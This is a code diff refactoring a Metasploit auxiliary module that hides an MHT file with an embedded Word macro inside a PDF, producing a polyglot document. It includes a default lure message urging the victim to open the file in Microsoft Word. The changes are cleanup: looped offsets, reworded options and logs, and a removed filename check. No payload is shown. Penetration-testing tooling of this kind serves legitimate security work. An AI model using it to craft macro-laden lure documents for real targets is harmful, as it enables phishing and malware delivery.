@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
-          'SideEffects' => [IOC_IN_LOGS]
+          'SideEffects' => []
         }
       )
     )
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptPath.new('FILENAME', [true, 'The input MHT filename with macro embedded']),
-        OptPath.new('INJECTED_PDF', [false, 'The input PDF filename to be injected (optional)']),
+        OptPath.new('INJECTED_PDF', [false, 'The input PDF filename to inject in (optional)']),
         OptString.new('MESSAGE_PDF', [false, 'The message to display in the local PDF template (if INJECTED_PDF is NOT used)', 'You must open this document in Microsoft Word'])
       ]
     )
@@ -93,12 +93,9 @@ class MetasploitModule < Msf::Auxiliary
     # calculation of dynamic offsets
     offsets = []
     offsets << 0
-    offsets << pdf.index('1 0 obj')
-    offsets << pdf.index('2 0 obj')
-    offsets << pdf.index('3 0 obj')
-    offsets << pdf.index('4 0 obj')
-    offsets << pdf.index('5 0 obj')
-    offsets << pdf.index('6 0 obj')
+    for i in 1..6 do
+      offsets << pdf.index("#{i} 0 obj")
+    end
 
     # XREF section
     xref_start = pdf.length
@@ -193,21 +190,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def rand_pdfheader
-    # List of recognized PDF versions
-    pdf_versions = [
-      '1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'
-    ]
-    # random verion selection
-    selected_version = pdf_versions.sample
+    selected_version = ['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'].sample
 
     "%PDF-#{selected_version}"
   end
 
   def run
-    if datastore['FILENAME'].nil? || datastore['FILENAME'].empty?
-      fail_with(Failure::BadConfig, 'No FILENAME provided')
-    end
-
     content = File.read(datastore['FILENAME'])
     if content.nil? || content.empty?
       fail_with(Failure::BadConfig, 'The MHT file content is empty')
@@ -215,13 +203,11 @@ class MetasploitModule < Msf::Auxiliary
 
     # if no pdf injected is provided, create new PDF from template
     if datastore['INJECTED_PDF'].nil? || datastore['INJECTED_PDF'].empty?
-      print_status('PDF creation using local template')
+      print_status('INJECTED_PDF not provided, creating the PDF from scratch')
       if datastore['MESSAGE_PDF'].nil? || datastore['MESSAGE_PDF'].empty?
         fail_with(Failure::BadConfig, 'No MESSAGE_PDF provided')
       end
       create_pdf(content)
-
-    # else if injected pdf is provided
     else
       print_status("PDF creation using '#{File.basename(datastore['INJECTED_PDF'])}' as template")
 
